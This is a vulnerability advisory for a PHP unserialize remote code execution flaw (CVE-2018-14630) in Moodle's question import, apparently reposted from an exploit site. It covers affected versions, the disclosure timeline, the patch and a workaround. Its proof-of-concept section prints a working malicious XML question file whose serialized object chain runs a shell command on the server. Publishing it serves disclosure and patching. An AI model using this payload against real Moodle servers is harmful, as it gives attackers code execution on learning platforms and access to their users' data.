@@ -1,0 +1,124 @@
+id: 31126
+date: 09/19/2018
+title: Moodle 3.x PHP Unserialize Remote Code Execution Exploit
+author: Johannes Moritz
+cves: CVE-2018-14630
+
+=======================================================================
+              title: Remote Code Execution via PHP unserialize
+            product: Moodle - Open-source learning platform
+ vulnerable version: 3.5 to 3.5.1, 3.4 to 3.4.4, 3.1 to 3.1.13 and
+                     earlier unsupported versions
+      fixed version: 3.5.2, 3.4.5, 3.3.8 and 3.1.14
+         CVE number: CVE-2018-14630
+             impact: critical
+           homepage: https://moodle.org/
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Moodle is a learning platform designed to provide educators, administrators
+and learners with a single robust, secure and integrated system to create
+personalised learning environments. Powering tens of thousands of learning
+environments globally, Moodle is trusted by institutions and organisations
+large and small, including Shell, London School of Economics,
+State University of New York, Microsoft and the Open University. Moodleas
+worldwide numbers of more than 90 million users across both academic and
+enterprise level usage makes it the worldas most widely used learning platform."
+
+Source: https://moodle.org/about
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+SEC Consult recommends to perform a thorough security review conducted by
+security professionals to identify and resolve all security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Remote Code Execution via PHP unserialize (CVE-2018-14630)
+When importing a "drag and drop into text" (ddwtos) question in the legacy
+Moodle XML format, the passed feedback answer is used unsanitized in an
+unserialize() function, which leads to a PHP Object Injection vulnerability.
+By providing a sophisticated PHP Object chain it is possible to leverage the
+POI into a fully-blown arbitrary Remote Code Execution (RCE).
+
+To exploit this vulnerability an attacker needs permissions to create a quiz
+or at least be able to import questions. A user of the role teacher usually has
+these permissions. However, students can also be assigned to the role teacher for
+a specific course.
+
+
+Proof of concept:
+-----------------
+1) Remote Code Execution via PHP unserialize (CVE-2018-14630)
+In order to exploit this issue an attacker has to open Moodle's question bank
+for a specific course and import the following Moodle XML file. The answer
+feedback contains a sophisticated PHP object chain which only contains objects
+from Moodles library. After the parsing process the command "echo `whoami`" is
+being executed.
+
+<?xml version="1.0" encoding="UTF-8"?>
+<quiz>
+  <question type="ddwtos">
+    <name>
+      <text>question name</text>
+    </name>
+    <questiontext format="html">
+      <text><![CDATA[<p>How is the weather?<br></p>]]></text>
+    </questiontext>
+ <answer fraction="100">
+  <feedback format="html">
+     <text>
+
+O:15:"\\core\\lock\\lock":2:{s:3:"key";O:23:"\\core_availability\\tree":1:{s:8:"children";O:24:"\\core\\dml\\recordset_walk":2:{s:8:"callback";s:6:"system";s:9:"recordset";O:25:"question_attempt_iterator":2:
+
+{s:4:"quba";O:26:"question_usage_by_activity":1:{s:16:"questionattempts";a:1:{s:4:"1337";s:13:"echo
+`whoami`";}}s:5:"slots";a:1:{i:0;i:1337;}}}}s:8:"infinite";i:1;}
+     </text>
+  </feedback>
+ </answer>
+  </question>
+</quiz>
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version has been tested which was the most recent one at the
+time of the test:
+
+* 3.5.1+
+
+According to the vendor, all previous versions are affected as well:
+* 3.5 to 3.5.1, 3.4 to 3.4.4, 3.1 to 3.1.13 and earlier unsupported versions
+
+
+Vendor contact timeline:
+------------------------
+2018-07-08: Vulnerability identified, further analysis (credits to Robin Peraglie
+            from RIPS Technologies)
+2018-07-09: Contacting vendor through tracker.moodle.org (issue [MDL-62880]
+            created)
+2018-07-09: Vendor replied and supplied a fix for the vulnerability
+2018-09-10: Vendor releases patched version
+2018-09-18: Public release of security advisory
+
+
+Solution:
+---------
+The vendor provides a patched version (3.5.2) which should be installed immediately:
+https://download.moodle.org/releases/latest/
+
+The vendor also provided a security advisory regarding this issue:
+https://moodle.org/mod/forum/discuss.php?d=376023#p1516118
+
+
+Workaround:
+-----------
+Disable import of ddwtos questions through XML files.
+
+#  0day.today [2023-03-26]  #
